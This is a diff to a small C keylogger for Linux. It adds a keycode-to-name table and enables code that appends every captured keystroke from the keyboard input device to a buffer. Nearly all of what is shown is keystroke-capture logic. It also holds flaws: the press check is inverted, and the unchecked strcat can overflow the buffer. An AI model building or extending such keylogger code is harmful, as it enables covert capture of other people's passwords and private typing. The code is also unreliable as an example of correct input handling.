@@ -1,12 +1,79 @@
 
-#include <stdio.h>
-#include <fcntl.h>
-#include <linux/input.h>
-#include <unistd.h>
-//#include <signal.h>
-#include <stdlib.h>
-#include <string.h>
 #include "keylogger.h"
+char *keycodes[] = {
+    "RESERVED",
+    "ESC",
+    "1",
+    "2",
+    "3",
+    "4",
+    "5",
+    "6",
+    "7",
+    "8",
+    "9",
+    "0",
+    "MINUS",
+    "EQUAL",
+    "BACKSPACE",
+    "TAB",
+    "Q",
+    "W",
+    "E",
+    "R",
+    "T",
+    "Y",
+    "U",
+    "I",
+    "O",
+    "P",
+    "LEFTBRACE",
+    "RIGHTBRACE",
+    "ENTER",
+    "LEFTCTRL",
+    "A",
+    "S",
+    "D",
+    "F",
+    "G",
+    "H",
+    "J",
+    "K",
+    "L",
+    "SEMICOLON",
+    "APOSTROPHE",
+    "GRAVE",
+    "LEFTSHIFT",
+    "BACKSLASH",
+    "Z",
+    "X",
+    "C",
+    "V",
+    "B",
+    "N",
+    "M",
+    "COMMA",
+    "DOT",
+    "SLASH",
+    "RIGHTSHIFT",
+    "KPASTERISK",
+    "LEFTALT",
+    "SPACE",
+    "CAPSLOCK",
+    "F1",
+    "F2",
+    "F3",
+    "F4",
+    "F5",
+    "F6",
+    "F7",
+    "F8",
+    "F9",
+    "F10",
+    "NUMLOCK",
+    "SCROLLLOCK"
+};
+
 char get_event_num(){
 
     const char *key_word = "keyboard";
@@ -72,10 +139,10 @@ int capture_keys(char *event_num){
         if(ev.type == 1){
             if(ev.value != 1){ // PRESSED
                 printf("key pressed: %s \n", keycodes[ev.code]);
-                //strcat(buffer, keycodes[ev.code]);
+                strcat(buffer, keycodes[ev.code]);
 
                 if(strlen(buffer) == BUFF_LINE-1){
-                    printf("needs to clean buffer!");
+                    printf("needs to clean buffer! \n");
                     memset(buffer,0,BUFF_LINE);
     
                 }
